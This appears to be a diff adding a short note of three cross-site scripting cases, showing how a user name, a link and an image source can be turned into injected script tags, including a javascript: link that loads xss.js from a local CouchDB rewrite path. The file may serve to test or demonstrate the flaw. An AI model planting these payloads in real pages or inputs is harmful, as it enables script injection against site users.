@@ -1,0 +1,12 @@
+1.
+from: UserName
+to: <script src="xss.js"></script>
+
+2.
+from: <a href="http://..">User Name</a>
+to: <a href="http://"></a>
+<a href="javascript:{d=document;s=d.createElement('script');s.setAttribute('src','http://localhost:5984/xss/_design/api/_rewrite/xss.js');d.body.appendChild(s)}void(0)">UserName</a>
+
+3.
+from: <img src='http://value' />
+to: <img src='http://' /><script src="xss.js"></script>value' />
